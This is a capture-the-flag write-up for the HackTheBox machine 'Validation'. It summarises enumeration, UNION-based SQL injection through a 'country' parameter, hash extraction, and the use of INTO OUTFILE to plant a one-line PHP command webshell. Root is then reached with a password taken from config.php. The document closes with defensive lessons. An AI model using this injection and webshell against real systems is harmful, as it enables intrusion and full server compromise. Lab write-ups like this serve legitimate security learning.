# HTB — Validation

**Official HTB page**: [Validation](https://app.hackthebox.com/machines/Validation?tab=machine_info)

**Difficulty**: easy  
**OS**: Linux  
**Release date**: 13 Sep, 2021  
**Platforms**: HackTheBox  
**Tags**: SQL

---

## Initial Enumeration
- Nmap scan revealed open ports:
  - 22 (SSH)
  - 80 (Apache HTTP)
  - 4566 (nginx - 403 Forbidden)
  - 8080 (nginx - 502 Bad Gateway)
- Web application accessible through port 80

---

## Vulnerability Identified
- Web application vulnerable to **SQL Injection** through the `country` parameter
- UNION-based SQL injection confirmed
- Database enumeration possible through `information_schema`

---

## Database Enumeration
- Current database identified using:
  - `union select database()`
- All available databases listed through:
  - `information_schema.schemata`
- Tables enumerated with:
  - `information_schema.tables`
- Columns enumerated with:
  - `information_schema.columns`
- User hashes extracted from the `registration` table using `GROUP_CONCAT`

---

## Remote Code Execution
- SQL injection allowed **writing arbitrary files** into `/var/www/html/` using `INTO OUTFILE`
- File write tested successfully by creating a test file
- A PHP webshell was written to the web root:
  - `<?php system($_GET['cmd']); ?>`
- Remote command execution achieved by accessing the uploaded webshell

---

## Privilege Escalation
- Sensitive credentials discovered inside configuration files
- Root password recovered from:
  - `/var/www/html/config.php`
- Root access obtained

---

## Key Takeaways
- Input validation and prepared statements are mandatory to prevent SQL injection
- `INTO OUTFILE` can lead directly to remote code execution if database permissions are misconfigured
- Configuration files often contain critical credentials that allow full compromise

